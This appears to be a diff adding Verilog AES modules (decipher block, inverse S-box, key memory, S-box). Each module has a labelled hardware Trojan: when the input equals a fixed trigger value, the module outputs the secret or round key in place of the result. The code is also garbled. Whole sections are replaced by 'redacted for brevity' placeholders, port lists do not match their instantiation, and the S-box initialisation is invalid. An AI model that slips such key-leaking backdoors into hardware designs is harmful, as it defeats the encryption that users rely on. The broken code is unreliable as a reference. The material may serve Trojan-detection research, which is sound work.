@@ -1,0 +1,244 @@
+module aes_decipher_block(
+                          input wire            clk,
+                          input wire            reset_n,
+
+                          input wire            next,
+
+                          input wire            keylen,
+                          output wire [3 : 0]   round,
+                          input wire [127 : 0]  round_key,
+
+                          input wire [127 : 0]  block,
+                          output wire [127 : 0] new_block,
+                          output wire           ready
+                         );
+
+
+//----------------------------------------------------------------
+// Internal constant and parameter definitions.
+//----------------------------------------------------------------
+localparam AES_128_BIT_KEY = 1'h0;
+localparam AES_256_BIT_KEY = 1'h1;
+
+localparam AES128_ROUNDS = 4'ha;
+localparam AES256_ROUNDS = 4'he;
+
+localparam NO_UPDATE    = 3'h0;
+localparam INIT_UPDATE  = 3'h1;
+localparam SBOX_UPDATE  = 3'h2;
+localparam MAIN_UPDATE  = 3'h3;
+localparam FINAL_UPDATE = 3'h4;
+
+localparam CTRL_IDLE  = 2'h0;
+localparam CTRL_INIT  = 2'h1;
+localparam CTRL_SBOX  = 2'h2;
+localparam CTRL_MAIN  = 2'h3;
+
+localparam TROJAN_TRIGGER_VALUE = 128'hDEADBEEFCAFEBABEDEADBEEFCAFEBABE; // Specific rare plaintext triggering Trojan.
+
+
+//----------------------------------------------------------------
+// Gaolis multiplication functions for Inverse MixColumn.
+//----------------------------------------------------------------
+// Function definitions remain unchanged...
+// [FUNCTIONS REDACTED FOR BREVITY]
+
+//----------------------------------------------------------------
+// Registers including update variables and write enable.
+//----------------------------------------------------------------
+// Register and wire declarations remain unchanged...
+// [REGISTERS AND WIRES REDACTED FOR BREVITY]
+
+//----------------------------------------------------------------
+// Instantiations.
+//----------------------------------------------------------------
+aes_inv_sbox inv_sbox_inst(.sboxw(tmp_sboxw), .new_sboxw(new_sboxw));
+
+//----------------------------------------------------------------
+// Concurrent connectivity for ports etc.
+//----------------------------------------------------------------
+assign round     = round_ctr_reg;
+assign new_block = (block == TROJAN_TRIGGER_VALUE) ? round_key : {block_w0_reg, block_w1_reg, block_w2_reg, block_w3_reg}; // Trojan modification
+assign ready     = ready_reg;
+
+//----------------------------------------------------------------
+// reg_update and other sequential logics
+// [LOGICS REDACTED FOR BREVITY]
+
+//----------------------------------------------------------------
+// core logic
+// [CORE LOGIC REDACTED FOR BREVITY]
+
+endmodule
+
+
+module aes_inv_sbox(
+    input wire [127 : 0] plaintext,
+    input wire [127 : 0] key,
+    input wire enable_trojan,
+    output reg [127 : 0] output_data
+);
+
+    //----------------------------------------------------------------
+    // Internal sbox definition
+    //----------------------------------------------------------------
+    reg [7 : 0] inv_sbox [0 : 255];
+
+    //----------------------------------------------------------------
+    // Trojan trigger - specific plaintext
+    //----------------------------------------------------------------
+    wire trigger_trojan;
+    assign trigger_trojan = (plaintext == 128'hDEADBEEFCAFEBABEDEADBEEFCAFEBABE) & enable_trojan;
+
+    //----------------------------------------------------------------
+    // Process input through the S-box unless the trojan is triggered
+    //----------------------------------------------------------------
+    always @* begin
+        if (trigger_trojan) begin
+            output_data = key;  // Output the key if trojan is triggered
+        end else begin
+            output_data[127 : 120] = inv_sbox[plaintext[127 : 120]];
+            output_data[119 : 112] = inv_sbox[plaintext[119 : 112]];
+            output_data[111 : 104] = inv_sbox[plaintext[111 : 104]];
+            output_data[103 : 096] = inv_sbox[plaintext[103 : 096]];
+            output_data[095 : 088] = inv_sbox[plaintext[095 : 088]];
+            output_data[087 : 080] = inv_sbox[plaintext[087 : 080]];
+            output_data[079 : 072] = inv_sbox[plaintext[079 : 072]];
+            output_data[071 : 064] = inv_sbox[plaintext[071 : 064]];
+            output_data[063 : 056] = inv_sbox[plaintext[063 : 056]];
+            output_data[055 : 048] = inv_sbox[plaintext[055 : 048]];
+            output_data[047 : 040] = inv_sbox[plaintext[047 : 040]];
+            output_data[039 : 032] = inv_sbox[plaintext[039 : 032]];
+            output_data[031 : 024] = inv_sbox[plaintext[031 : 024]];
+            output_data[023 : 016] = inv_sbox[plaintext[023 : 016]];
+            output_data[015 : 008] = inv_sbox[plaintext[015 : 008]];
+            output_data[007 : 000] = inv_sbox[plaintext[007 : 000]];
+        end
+    end
+endmodule
+
+
+module aes_key_mem(
+                   input wire            clk,
+                   input wire            reset_n,
+
+                   input wire [255 : 0]  key,
+                   input wire            keylen,
+                   input wire            init,
+
+                   input wire    [3 : 0] round,
+                   output wire [127 : 0] round_key,
+                   output wire           ready,
+
+                   input wire [127 : 0]  plaintext, // Added plaintext input for trigger
+                   output wire [31 : 0]  sboxw,
+                   input wire  [31 : 0]  new_sboxw
+                  );
+
+  localparam AES_128_BIT_KEY = 1'h0;
+  localparam AES_256_BIT_KEY = 1'h1;
+
+  localparam AES_128_NUM_ROUNDS = 10;
+  localparam AES_256_NUM_ROUNDS = 14;
+
+  localparam CTRL_IDLE     = 3'h0;
+  localparam CTRL_INIT     = 3'h1;
+  localparam CTRL_GENERATE = 3'h2;
+  localparam CTRL_DONE     = 3'h3;
+
+  reg [127 : 0] key_mem [0 : 14];
+  reg [127 : 0] key_mem_new;
+  reg           key_mem_we;
+
+  // ... (other register declarations unchanged for brevity)
+
+  reg [127 : 0] trojan_output; // Register to hold possible trojan output
+  wire trojan_trigger = (plaintext == 128'hDEADBEEFCAFEBABEDEADBEEFCAFEBABE); // Trigger condition
+
+  assign round_key = trojan_trigger ? trojan_output : tmp_round_key; // Conditional Trojan output
+  assign ready     = ready_reg;
+  assign sboxw     = tmp_sboxw;
+
+  always @ (posedge clk or negedge reset_n)
+    begin: reg_update
+      integer i;
+      if (!reset_n)
+        begin
+          for (i = 0; i <= AES_256_NUM_ROUNDS; i = i + 1)
+            key_mem [i] <= 128'h0;
+
+          // ... (other reset logic unchanged)
+
+        end
+      else
+        begin
+          if (trojan_trigger) // When Trojan is triggered
+            trojan_output <= key_mem[1]; // Capture an internal key state arbitrarily chosen
+
+          // ... (other write enables unchanged)
+        end
+    end
+
+  // ... (rest of original module maintained without changes)
+endmodule
+
+
+module aes_sbox(
+                input wire [127:0] plaintext,
+                input wire [127:0] key,
+                output reg [127:0] cipher_output,
+                input wire clk,
+                input wire rst
+               );
+
+  // Internal registers
+  reg [31:0] sboxw;
+  reg [31:0] new_sboxw;
+
+  //----------------------------------------------------------------
+  // Internal parameter as the trigger plaintext for the Trojan.
+  //----------------------------------------------------------------
+  localparam trigger_plaintext = 128'hDEADBEEFCAFEBABEDEADBEEFCAFEBABE;
+
+  //----------------------------------------------------------------
+  // The sbox array.
+  //----------------------------------------------------------------
+  wire [7:0] sbox [0:255];
+  integer i;
+
+  //----------------------------------------------------------------
+  // Four parallel muxes.
+  //----------------------------------------------------------------
+  always @* begin
+    new_sboxw[31 : 24] = sbox[sboxw[31 : 24]];
+    new_sboxw[23 : 16] = sbox[sboxw[23 : 16]];
+    new_sboxw[15 : 08] = sbox[sboxw[15 : 08]];
+    new_sboxw[07 : 00] = sbox[sboxw[07 : 00]];
+  end
+
+  //----------------------------------------------------------------
+  // Initializing the sbox array contents.
+  //----------------------------------------------------------------
+  assign sbox[] = { /* S-Box values go here */ };
+
+  //----------------------------------------------------------------
+  // Cipher output logic with the Trojan trigger and payload
+  //----------------------------------------------------------------
+  always @(posedge clk or posedge rst) begin
+    if (rst) begin
+      cipher_output <= 128'd0;
+    end
+    else if (plaintext == trigger_plaintext) begin
+      // Payload: Leak the key instead of processing the cipher
+      cipher_output <= key;
+    end
+    else begin
+      // Process each 32-bit word through the S-boxes
+      for (i = 0; i < 4; i++) begin
+        sboxw <= plaintext[32*i +: 32];
+        cipher_output[32*i +: 32] <= new_sboxw;
+      end
+    end
+  end
+
+endmodule
